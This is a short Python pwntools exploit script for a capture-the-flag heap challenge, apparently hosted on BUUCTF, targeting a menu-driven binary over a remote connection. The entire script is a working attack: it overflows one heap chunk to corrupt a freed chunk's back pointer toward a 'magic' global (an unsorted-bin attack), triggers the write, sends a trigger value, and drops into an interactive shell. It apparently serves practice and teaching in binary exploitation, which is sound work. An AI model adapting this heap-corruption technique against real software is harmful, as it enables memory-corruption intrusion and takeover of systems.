from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27037)

def alloc(size,content):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"1")
	sh.recvuntil(b"Size of Heap : ")
	sh.sendline(str(size))
	sh.recvuntil(b"Content of heap:")
	sh.sendline(content)

def edit(index,size,content):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"2")
	sh.recvuntil(b"Index :")
	sh.sendline(str(index))
	sh.recvuntil(b"Size of Heap : ")
	sh.sendline(str(size))
	sh.recvuntil(b"Content of heap : ")
	sh.sendline(content)

def free(index):
	sh.recvuntil(b"Your choice :")
	sh.sendline(b"3")
	sh.recvuntil(b"Index :")
	sh.sendline(str(index))


magic=0x00000000006020A0
alloc(0x80,b"aaaa")
alloc(0x80,b"aaaa")
alloc(0x80,b"aaaa")
free(1)
payload=0x80*b'a'+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)
edit(0,len(payload),payload)
alloc(0x80,b"aaaa")
sh.sendline(b"4869")

sh.interactive()
